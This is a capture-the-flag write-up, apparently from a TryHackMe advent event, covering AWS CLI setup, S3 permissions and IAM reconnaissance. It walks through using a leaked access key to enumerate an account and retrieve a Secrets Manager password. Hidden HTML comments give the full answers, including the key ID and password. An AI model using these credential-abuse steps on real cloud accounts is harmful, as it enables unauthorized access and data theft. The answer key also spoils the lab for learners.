# Day 17 - Elf Leaks

> In a move to taunt the Best Festival Company, Grinch Enterprises sends out
> an email to the entire company with everyone's name and date of birth.
> McSkidy looks quite stressed with the breach and thinks about the potential
> legal consequences. She talks to McInfra to try to determine the origin of
> the breach.


Today we'll be covering the basics of AWS.

## Installing AWS CLI
https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

### Download

```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
```

! `curl` might not work. If so, use `wget` instead.

```bash
wget "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"

mv awscli-exe-linux-x86_64.zip awscliv2.zip
```

### Install

Unzip
```bash
unzip awscliv2.zip
```

With sudo
```bash
sudo ./aws/install
```

No sudo

You can install without sudo if you specify directories that you already have write permissions to. Use the following instructions for the install command to specify the installation location:

* Ensure that the paths you provide to the -i and -b parameters contain no volume name or directory names that contain any space characters or other white space characters. If there is a space, the installation fails.

* --install-dir or -i – This option specifies the directory to copy all of the files to.
<br/>The default value is /usr/local/aws-cli.

* --bin-dir or -b – This option specifies that the main aws program in the install directory is symbolically linked to the file aws in the specified path. You must have write permissions to the specified directory. Creating a symlink to a directory that is already in your path eliminates the need to add the install directory to the user's $PATH variable.
<br/>The default value is /usr/local/bin.

## AWS S3

In my case `AWS CLI` was significantly slower then `curl`!

### List bucket content.
Can use `curl` or `asw`(CLI tool).

```bash
# Using curl
curl http://irs-form-990.s3.amazonaws.com/

# Or AWS cli
aws s3 ls s3://irs-form-990/ --no-sign-request
```

### Download object

```bash
# curl
curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml -o 201101319349101615_public.xml

# AWS CLI:
aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request

```

## Amazon S3 Authentication Levels

Read access

|Bucket | Object | Comment|
|:---:|:---:|:--- |
| + | + | Both readable|
| + | - | Bucket readable, Object not|
| - | + | Bucket not, Object readable|
| - | - | Bucket not readable, Object not readable|


> Note: you can also have public write permissions to a Bucket. This is generally a bad idea and has been the vector of several crypto-mining incidents. 
https://www.theregister.com/2018/02/22/la_times_amazon_aws_s3/


> There are also two levels of public buckets and objects. The first level is "Anyone." This is what you experienced with the irs-form-990 bucket. You could just hit that URL from your local browser. The second level is just as public - and that is public to Any AWS Customer (what AWS foolishly called AuthenticatedUsers for many years). Anyone with a credit card can create an AWS account; therefore, Authenticated Users doesn't provide much data protection.



| ACL Name | BUCKET | OBJECT |
|:---:| --- | --- |
| Anyone | Anonymously list contents of the bucket via `curl` or with `aws s3 ls --no-sign-request` | Ability to download via `curl` or `aws s3 cp --no-sign-request`
| AuthenticatedUsers | Can only list the bucket with active AWS keys via `aws s3 ls` | You can only download the object with active AWS Keys via `aws s3 cp`


## AWS IAM

Excluding a few older services like Amazon S3, all requests to AWS services must be signed. 

IAM Access Keys consist of an Access Key ID and the Secret Access Key. 

Access Key IDs always begin with the letters AKIA and are 20 characters long.

The Secret Access Key is 40 characters long.

There is another type of credentials, short-term credentials, where the Access Key ID begins with the letters ASIA and includes an additional string called the Session Token. 

### Conducting Reconnaissance with IAM

Credentials to AWS can be added to AWS Profile in the AWS CLI:

```bash
aws configure --profile PROFILENAME
```

This command will add entries to the `.aws/config` and `.aws/credentials` files in user's home directory. 

__That can be useful while pen testing. Check this files for credentials, if they exist.__

To list files with found credentials:
```bash
aws s3 ls --profile PROFILENAME
```

> __ProTip:__ Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to. 

#### A few other common AWS reconnaissance techniques are:

* Finding the Account ID belonging to an access key:
```bash
aws sts get-access-key-info --access-key-id AKIAEXAMPLE 
```

* Determining the Username the access key you're using belongs to
```bash
aws sts get-caller-identity --profile PROFILENAME
```
* Listing all the EC2 instances running in an account
```bash
aws ec2 describe-instances --output text --profile PROFILENAME
```   

* Listing all the EC2 instances running in an account in a different region
```bash
aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME
```

### AWS ARNs

An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.

The format is:
```
arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
```

# Challenge


### What is the name of the S3 Bucket
```
i*****.be***************ny.com
```
<!-- images.bestfestivalcompany.com. -->

### What is the message left in the flag.txt
```bash
curl https://s3.amazonaws.com/i*****.be***************ny.com/flag.txt
```
<!-- It's easy to get your elves data when you leave it so easy to find! -->


### What other file in that bucket looks interesting to you?
```bash
# it is slower but easier to read
aws s3 ls s3://i*****.be***************ny.com --no-sign-request
```
<!-- wp-backup.zip -->

### What is the AWS Access Key ID in that file?
```
AKI*************AOI
```
<!-- AKIAQI52OJVCPZXFYAOI -->


### What is the AWS Account ID that access-key works for?

```bash
aws configure --profile TryHackMeDay17
aws sts get-access-key-info --access-key-id AKI*************AOI --profile TryHackMeDay17
```
```json
{
    "Account": "01********76"
}
```
<!--
 {
    "Account": "019181489476"
}
-->

### What is the Username for that access-key?
```bash
aws sts get-caller-identity --profile TryHackMeDay17
```

```json
{
    "UserId": "*********",
    "Account": "*********",
    "Arn": "arn:aws:iam::*********:user/********@***.com"
}
```

<!-- 
{
    "UserId": "AIDAQI52OJVCFHT3E73BO",
    "Account": "019181489476",
    "Arn": "arn:aws:iam::019181489476:user/ElfMcHR@bfc.com"
}
-->

### There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?

```bash
aws ec2 describe-instances --output text --region us-east-1 --profile TryHackMeDay17
```

```
RESERVATIONS	0**********6	043234062703	r-0e89ba65b28a7c699
INSTANCES	0	x86_64	HR-Po-Insta-1NAKAMW2PPVMT	False	True	xen	ami-0c2b8ca1dad447f8a	i-0c56041ac61cf5a95	t3a.micro	hr-key	2021-11-13T12:36:58+00:00	Linux/UNIX	ip-172-31-68-81.ec2.internal	172.31.68.81		/dev/xvda	ebs	True	User initiated (2021-11-13 12:42:39 GMT)	subnet-00b1107c0c18c0722	RunInstances	2021-11-13T12:36:58+00:00	hvm	vpc-0235b5a9591606b73
BLOCKDEVICEMAPPINGS	/dev/xvda
EBS	2021-11-13T12:36:59+00:00	True	attached	vol-0ac79339aac8b249d
CAPACITYRESERVATIONSPECIFICATION	open
CPUOPTIONS	1	2
ENCLAVEOPTIONS	False
HIBERNATIONOPTIONS	False
METADATAOPTIONS	enabled	disabled	1	optional	applied
MONITORING	disabled
NETWORKINTERFACES		interface	16:35:78:d8:60:d1	eni-027945da0ddb79e59	0**********6	ip-172-31-68-81.ec2.internal	172.31.68.81	True	in-use	subnet-00b1107c0c18c0722	vpc-0235b5a9591606b73
ATTACHMENT	2021-11-13T12:36:58+00:00	eni-attach-0d91e2137f6014220	True	0	0	attached
GROUPS	sg-0c6e7cd87c1c8d035	default
PRIVATEIPADDRESSES	True	ip-172-31-68-81.ec2.internal	172.31.68.81
PLACEMENT	us-east-1f		default
PRIVATEDNSNAMEOPTIONS	False	False	ip-name
SECURITYGROUPS	sg-0c6e7cd87c1c8d035	default
STATE	80	stopped
STATEREASON	Client.UserInitiatedShutdown	Client.UserInitiatedShutdown: User initiated shutdown
TAGS	aws:cloudformation:stack-id	arn:aws:cloudformation:us-east-1:0**********6:stack/**-****al/5ebc4e90-447e-11ec-a711-12d63f44d7b7
TAGS	aws:cloudformation:logical-id	Instance
TAGS	created_by	Elf McHR
TAGS	aws:cloudformation:stack-name	**-****al
TAGS	Name	**-****al

```

<!-- HR-Portal -->


### What is the database password stored in Secrets Manager?
https://docs.aws.amazon.com/secretsmanager/latest/userguide/tutorials_basic.html

```bash
aws secretsmanager list-secrets --profile TryHackMeDay17
```
There we found secret ARN: `arn:aws:secretsmanager:******:*******:******:******-8AkWYF`
<!-- arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF -->

Now get its value
```bash
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:******:*******:******:******-8AkWYF --profile TryHackMeDay17
```

That's not it! (read string)
```json
{
    "ARN": "arn:aws:secretsmanager:******:*******:******:******-8AkWYF",
    "Name": "HR-Password",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-11-24T04:29:07.718000+03:00"
}
```

But there is a hint! lets make another request:

```bash
aws secretsmanager list-secrets --profile TryHackMeDay17 --region <WHERE_SANTA_LIVES??>
```
<!-- eu-north-1 -->

New ARN: 
```
arn:aws:secretsmanager:******:*****:*****:*******-KIJEvK
```
<!-- arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK -->


And new request for value with new intel:

```bash
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:******:*****:*****:*******-KIJEvK --profile TryHackMeDay17 --region <WHERE_SANTA_LIVES??>
```
<!--
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK --profile TryHackMeDay17 --region eu-north-1
-->


We got password!

```json
{
    "ARN": "arn:aws:secretsmanager:******:*****:*****:*******-KIJEvK",
    "Name": "HR-Password",
    "VersionId": "f806c3cd-ea20-4a1a-948f-80927f3ad366",
    "SecretString": "Wi********",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-11-13T16:26:19.996000+03:00"
}
```

<!--
{
    "ARN": "arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK",
    "Name": "HR-Password",
    "VersionId": "f806c3cd-ea20-4a1a-948f-80927f3ad366",
    "SecretString": "Winter2021!",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-11-13T16:26:19.996000+03:00"
}

-->